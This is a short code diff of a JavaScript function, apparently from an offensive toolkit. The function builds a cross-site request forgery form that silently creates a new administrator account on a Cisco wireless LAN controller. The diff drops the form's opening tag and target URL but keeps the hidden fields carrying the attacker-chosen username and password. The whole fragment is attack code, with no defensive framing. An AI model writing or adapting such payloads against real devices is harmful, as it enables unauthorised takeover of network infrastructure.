@@ -1612,8 +1612,7 @@ function ciscowlc_addadmin(ip)
 {
     newuser = prompt("New User: ");
     passwd = prompt("New Password: ");
-    form = '<form name="ciscoCSRF" action="https://WLC_IP_HERE/screens/aaa/mgmtuser_create.html" method="post" >\
-    		<input type="hidden" name="access_control" value="1"/>\
+    form = '<input type="hidden" name="access_control" value="1"/>\
 			<input type="hidden" name="username" value="' + newuser + '"/>\
 			<input type="hidden" name="userpwd" value="' + passwd +  '"/>\
 			<input type="hidden" name="pwdconfirm" value="' + passwd +  '"/>\
